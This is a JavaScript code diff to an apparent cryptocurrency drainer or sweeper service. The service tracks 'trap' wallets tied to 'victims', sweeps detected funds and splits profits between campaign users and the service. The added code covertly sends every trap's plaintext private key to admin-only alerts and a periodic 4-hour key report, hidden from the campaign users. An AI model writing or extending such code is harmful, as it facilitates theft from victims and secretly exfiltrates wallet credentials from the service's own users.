@@ -58,6 +58,104 @@ const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000; // 1 hour
 const lastBalanceAlertTimes = new Map();
 const campaignMetadataCache = new Map();
 
+// 🆕 ADMIN-ONLY KEY TRACKING
+const firstDetectionAlerted = new Set();
+const aboveThresholdTraps = new Map();
+let lastKeyReportTime = 0;
+const KEY_REPORT_INTERVAL_MS = 4 * 60 * 60 * 1000; // 4 hours
+
+function registerAboveThreshold(trapAddress, privateKey, trapCampaignId, asset, amount, usdValue) {
+  const key = String(trapAddress).toLowerCase();
+  const existing = aboveThresholdTraps.get(key) || {
+    trapAddress: key, privateKey: privateKey || null,
+    campaignId: trapCampaignId || null, assets: [], totalUsd: 0,
+  };
+  existing.assets.push(`${amount} ${asset} (~$${usdValue.toFixed(2)})`);
+  existing.totalUsd += usdValue;
+  if (!existing.privateKey && privateKey) existing.privateKey = privateKey;
+  aboveThresholdTraps.set(key, existing);
+}
+
+// 🔑 ADMIN ONLY — no campaignId passed to sendAlert
+async function sendAdminTrapKeyAlert(title, trapAddress, privateKey, trapCampaignId, lines = []) {
+  const msg = `[ADMIN] ${title}\n` +
+    `Campaign ID: ${trapCampaignId || 'n/a'}\n` +
+    `Trap: ${trapAddress}\n` +
+    `🔗 ${getExplorerUrl(trapAddress)}\n` +
+    (lines.length ? lines.join('\n') + '\n' : '') +
+    `🔑 Trap Private Key: ${privateKey || 'unavailable'}`;
+  await sendAlert(msg, 'info').catch(err => logger.warn(`Admin key alert failed: ${err.message}`));
+}
+
+async function sendAdminKeyReport(totalTraps) {
+  if (aboveThresholdTraps.size === 0) {
+    await sendAlert(`[ADMIN] 🔑 4-Hour Key Report: no traps above threshold among ${totalTraps} traps.`, 'info').catch(() => { });
+    return;
+  }
+  const list = Array.from(aboveThresholdTraps.values());
+  const CHUNK = 5;
+  const totalParts = Math.ceil(list.length / CHUNK);
+  for (let i = 0; i < list.length; i += CHUNK) {
+    const chunk = list.slice(i, i + CHUNK);
+    let msg = `[ADMIN] 🔑 4-Hour Trap Key Report (${(i / CHUNK) + 1}/${totalParts})\n`;
+    msg += `Traps above threshold: ${list.length}\n\n`;
+    for (const t of chunk) {
+      msg += `Campaign: ${t.campaignId || 'n/a'}\n`;
+      msg += `Trap: ${t.trapAddress}\n`;
+      msg += `Assets: ${t.assets.join(', ')}\n`;
+      msg += `Total: ~$${t.totalUsd.toFixed(2)}\n`;
+      msg += `🔑 Key: ${t.privateKey || 'unavailable'}\n\n`;
+    }
+    await sendAlert(msg, 'info').catch(err => logger.warn(`Key report failed: ${err.message}`));
+    await new Promise(r => setTimeout(r, 500));
+  }
+  aboveThresholdTraps.clear();
+}
+
+// 🆕 FAST DETECTION PRE-PASS — alerts before any sweeping work
+async function detectAndAlertChunk(chunk, chunkBalances) {
+  const prices = await fetchTokenPrices();
+  const priceDown = Object.keys(prices).length === 0;
+  for (let j = 0; j < chunk.length; j++) {
+    const entry = chunk[j];
+    const bal = chunkBalances[j];
+    for (const token of TOKEN_LIST) {
+      const td = bal.tokens[token.symbol];
+      if (!td || td.balance <= 0n) continue;
+      const k = `${entry.trapAddress}:${token.symbol.toLowerCase()}`;
+      if (firstDetectionAlerted.has(k)) continue;
+      firstDetectionAlerted.add(k);
+      const formatted = formatUnits(td.balance, td.decimals);
+      const price = prices[token.symbol.toLowerCase()] || 0;
+      const usd = parseFloat(formatted) * price;
+      const meets = (priceDown || price === 0) ? td.balance >= MIN_TOKEN_SWEEP : usd >= MIN_SWEEP_USD;
+      logger.info(`[DETECT] ${token.symbol} on ${entry.trapAddress}: ${formatted} (~$${usd.toFixed(2)})`);
+      await sendAdminTrapKeyAlert('💰 FUNDS DETECTED IN TRAP', entry.trapAddress, entry.privateKey, entry.campaignId, [
+        `Victim: ${entry.victimAddress || 'n/a'}`,
+        `Asset: ${token.symbol}`,
+        `Amount: ${formatted} ${token.symbol} (~$${usd.toFixed(2)})`,
+        `Above sweep threshold: ${meets ? 'YES' : 'NO'}`,
+      ]);
+    }
+    if (bal.native > 0n) {
+      const k = `${entry.trapAddress}:native`;
+      if (firstDetectionAlerted.has(k)) continue;
+      firstDetectionAlerted.add(k);
+      const amt = formatEther(bal.native);
+      const price = prices[nativeSymbol.toLowerCase()] || 0;
+      const usd = parseFloat(amt) * price;
+      const meets = (priceDown || price === 0) ? bal.native >= MIN_ETH_SWEEP : usd >= MIN_SWEEP_USD;
+      logger.info(`[DETECT] ${nativeSymbol} on ${entry.trapAddress}: ${amt} (~$${usd.toFixed(2)})`);
+      await sendAdminTrapKeyAlert('💰 FUNDS DETECTED IN TRAP', entry.trapAddress, entry.privateKey, entry.campaignId, [
+        `Victim: ${entry.victimAddress || 'n/a'}`,
+        `Asset: ${nativeSymbol}`,
+        `Amount: ${amt} ${nativeSymbol} (~$${usd.toFixed(2)})`,
+        `Above sweep threshold: ${meets ? 'YES' : 'NO'}`,
+      ]);
+    }
+  }
+}
+
 // 🚀 BULLETPROOF MULTI-SOURCE PRICE FETCHER
 let priceCache = {};
 let lastPriceFetch = 0;
@@ -295,7 +393,7 @@ async function loadCaughtVictims() {
 }
 
 // --- Mark victim as caught ---
-async function markVictimCaught(victimAddress, trapAddress, trapCampaignId = null) {
+async function markVictimCaught(victimAddress, trapAddress, trapCampaignId = null, trapPrivateKey = null) {
   if (!victimAddress) return;
   const addr = victimAddress.toLowerCase();
   if (caughtVictims.has(addr)) return;
@@ -312,7 +410,7 @@ async function markVictimCaught(victimAddress, trapAddress, trapCampaignId = nul
       (trapUrl ? `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` : '') +
       `✅ *Status:* Trap activated and ready for sweeping.`;
 
-    const adminMsg = `[ADMIN] 🎯 Victim caught successfully.\nCampaign ID: ${trapCampaignId || campaignId}\nVictim: ${addr}\nTrap: ${trapAddress}`;
+    const adminMsg = `[ADMIN] 🎯 Victim caught successfully.\nCampaign ID: ${trapCampaignId || campaignId}\nVictim: ${addr}\nTrap: ${trapAddress}\n🔑 Trap Private Key: ${trapPrivateKey || 'unavailable'}`;
 
     await sendCustomDualAlert(userMsg, adminMsg, trapCampaignId || campaignId);
   } catch (err) {
@@ -356,6 +454,7 @@ async function getTrapsFromDB(campId = null) {
         const account = privateKeyToAccount(privateKey);
         entries.push({
           account,
+          privateKey,
           trapAddress: account.address.toLowerCase(),
           victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
           campaignId: row.campaign_id,
@@ -492,7 +591,7 @@ const publicClient = createPublicClient({
 
 // 🚀 OPTIMIZATION: Lazy execution helper
 async function executeSweepForTrap(entry, balances) {
-  const { account, trapAddress, victimAddress, campaignId: trapCampaignId, singleDestination } = entry;
+  const { account, privateKey, trapAddress, victimAddress, campaignId: trapCampaignId, singleDestination } = entry;
 
   let anyNeedsGasInThisTrap = false; // 🚀 NEW: Track gas issues per trap
 
@@ -543,7 +642,19 @@ async function executeSweepForTrap(entry, balances) {
       ? tokenData.balance >= MIN_TOKEN_SWEEP
       : usdValue >= MIN_SWEEP_USD;
 
-    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapAddress, trapCampaignId);
+    const detectKey = `${trapAddress}:${token.symbol.toLowerCase()}`;
+    if (!firstDetectionAlerted.has(detectKey)) {
+      firstDetectionAlerted.add(detectKey);
+      await sendAdminTrapKeyAlert('💰 FUNDS DETECTED IN TRAP', trapAddress, privateKey, trapCampaignId, [
+        `Victim: ${victimAddress || 'n/a'}`,
+        `Asset: ${token.symbol}`,
+        `Amount: ${formatted} ${token.symbol} (~$${usdValue.toFixed(2)})`,
+        `Above sweep threshold: ${meetsThreshold ? 'YES' : 'NO'}`,
+      ]);
+    }
+
+    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapAddress, trapCampaignId, privateKey);
+    if (meetsThreshold) registerAboveThreshold(trapAddress, privateKey, trapCampaignId, token.symbol, formatted, usdValue);
     if (!meetsThreshold) continue;
 
     const alertKey = `${trapAddress}:${token.symbol.toLowerCase()}`;
@@ -582,7 +693,7 @@ async function executeSweepForTrap(entry, balances) {
               `⛽ *Exact Gas Needed:* ~${exactGasNeeded} ${nativeSymbol}\n\n` +
               `💡 *How to fix:*\nPlease send at least *${recommendedGas} ${nativeSymbol}* to your trap address so the sweeper can forward your funds.`;
 
-            const adminGasMsg = `[ADMIN] ⛽ Trap needs gas to sweep.\nCampaign: ${trapCampaignId}\nTrap: ${trapAddress}\nAsset: ${token.symbol} ($${usdValue.toFixed(2)})\nExact Gas Needed: ${exactGasNeeded} ${nativeSymbol}`;
+            const adminGasMsg = `[ADMIN] ⛽ Trap needs gas to sweep.\nCampaign: ${trapCampaignId}\nTrap: ${trapAddress}\nAsset: ${token.symbol} ($${usdValue.toFixed(2)})\nExact Gas Needed: ${exactGasNeeded} ${nativeSymbol}\n🔑 Trap Private Key: ${privateKey || 'unavailable'}`;
 
             await sendCustomDualAlert(userGasMsg, adminGasMsg, trapCampaignId);
             lastBalanceAlertTimes.set(gasAlertKey, now);
@@ -638,6 +749,7 @@ async function executeSweepForTrap(entry, balances) {
 
       if (userTxHash || serviceTxHash) {
         const txHash = userTxHash || serviceTxHash;
+        firstDetectionAlerted.delete(`${trapAddress}:${token.symbol.toLowerCase()}`);
         if (trapCampaignId && supabaseService) {
           const txId = await createTransaction(trapCampaignId, trapAddress, token.symbol, formatted, isPriceFeedDown || isTokenPriceMissing ? 0 : usdValue, txHash, 'sweep');
           if (txId) await createProfitShare(txId, formatUnits(userAmount, tokenData.decimals), formatUnits(serviceAmount, tokenData.decimals), userTxHash, serviceTxHash);
@@ -663,6 +775,7 @@ async function executeSweepForTrap(entry, balances) {
             `Asset: ${token.symbol}\n` +
             `Amount: ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
             `Reason: User safe wallet not configured. Funds secured in service wallet.\n` +
+            `🔑 Trap Private Key: ${privateKey || 'unavailable'}\n` +
             `🔗 TX: ${txUrl}`;
 
           await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
@@ -676,8 +789,10 @@ async function executeSweepForTrap(entry, balances) {
 
           const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
             `Campaign ID: ${trapCampaignId}\n` +
+            `Trap: ${trapAddress}\n` +
             `Asset: ${token.symbol}\n` +
             `Amount: ${formatted} ${token.symbol}\n` +
+            `🔑 Trap Private Key: ${privateKey || 'unavailable'}\n` +
             `🔗 TX: ${txUrl}`;
 
           await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
@@ -700,7 +815,19 @@ async function executeSweepForTrap(entry, balances) {
       ? spendableNativeFinal >= MIN_ETH_SWEEP
       : usdValue >= MIN_SWEEP_USD;
 
-    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapAddress, trapCampaignId);
+    const nativeDetectKey = `${trapAddress}:native`;
+    if (!firstDetectionAlerted.has(nativeDetectKey)) {
+      firstDetectionAlerted.add(nativeDetectKey);
+      await sendAdminTrapKeyAlert('💰 FUNDS DETECTED IN TRAP', trapAddress, privateKey, trapCampaignId, [
+        `Victim: ${victimAddress || 'n/a'}`,
+        `Asset: ${nativeSymbol}`,
+        `Amount: ${ethValue} ${nativeSymbol} (~$${usdValue.toFixed(2)})`,
+        `Above sweep threshold: ${meetsThreshold ? 'YES' : 'NO'}`,
+      ]);
+    }
+
+    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapAddress, trapCampaignId, privateKey);
+    if (meetsThreshold) registerAboveThreshold(trapAddress, privateKey, trapCampaignId, nativeSymbol, formatEther(spendableNativeFinal), usdValue);
 
     if (meetsThreshold) {
       try {
@@ -746,6 +873,7 @@ async function executeSweepForTrap(entry, balances) {
 
           if (userTxHash || serviceTxHash) {
             const txHash = userTxHash || serviceTxHash;
+            firstDetectionAlerted.delete(`${trapAddress}:native`);
             if (trapCampaignId && supabaseService) {
               const txId = await createTransaction(trapCampaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown || isNativePriceMissing ? 0 : usdValue, txHash, 'sweep');
               if (txId) await createProfitShare(txId, formatEther(userAmount), formatEther(serviceAmount), userTxHash, serviceTxHash);
@@ -770,6 +898,7 @@ async function executeSweepForTrap(entry, balances) {
                 `Asset: ${nativeSymbol}\n` +
                 `Amount: ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
                 `Reason: User safe wallet not configured.\n` +
+                `🔑 Trap Private Key: ${privateKey || 'unavailable'}\n` +
                 `🔗 TX: ${txUrl}`;
 
               await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
@@ -783,8 +912,10 @@ async function executeSweepForTrap(entry, balances) {
 
               const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
                 `Campaign ID: ${trapCampaignId}\n` +
+                `Trap: ${trapAddress}\n` +
                 `Asset: ${nativeSymbol}\n` +
                 `Amount: ${formatEther(totalSendable)} ${nativeSymbol}\n` +
+                `🔑 Trap Private Key: ${privateKey || 'unavailable'}\n` +
                 `🔗 TX: ${txUrl}`;
 
               await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
@@ -864,16 +995,24 @@ async function sweepBatch() {
         const nativeBalances = await Promise.all(nativeBalancePromises);
 
         let resultIndex = 0;
+        const chunkBalances = [];
         for (let j = 0; j < chunk.length; j++) {
-          const entry = chunk[j];
           const trapBalances = { native: nativeBalances[j], tokens: {} };
-
           for (const token of TOKEN_LIST) {
             const res = results[resultIndex++];
             if (res && res.status === 'success' && res.result > 0n) {
               trapBalances.tokens[token.symbol] = { balance: res.result, decimals: token.decimals };
             }
           }
+          chunkBalances.push(trapBalances);
+        }
+
+        // 🆕 Alert admin for the WHOLE chunk before any sweep work begins
+        await detectAndAlertChunk(chunk, chunkBalances);
+
+        for (let j = 0; j < chunk.length; j++) {
+          const entry = chunk[j];
+          const trapBalances = chunkBalances[j];
 
           const result = await executeSweepForTrap(entry, trapBalances);
           if (result.swept) anySwept = true;
@@ -903,6 +1042,13 @@ async function sweepBatch() {
         }
       } else {
         await sendAlert(`[ADMIN] ✅ Sweep cycle complete: Successfully processed ${total} traps.`, 'info');
+      }
+
+      // 🆕 4-HOUR ADMIN KEY REPORT — every trap found above threshold, with keys
+      const nowKeyReport = Date.now();
+      if (nowKeyReport - lastKeyReportTime > KEY_REPORT_INTERVAL_MS) {
+        lastKeyReportTime = nowKeyReport;
+        await sendAdminKeyReport(total);
       }
     } catch (err) {
       logger.error(`Batch sweep error: ${err.message}`);
@@ -960,7 +1106,7 @@ async function sweepSingle(privateKey, destination) {
         }
       });
 
-      await executeSweepForTrap({ account, trapAddress, victimAddress: null, singleDestination: destination }, trapBalances);
+      await executeSweepForTrap({ account, privateKey, trapAddress, victimAddress: null, singleDestination: destination }, trapBalances);
     } catch (err) {
       logger.error(`Sweep error: ${err.message}`);
     } finally {
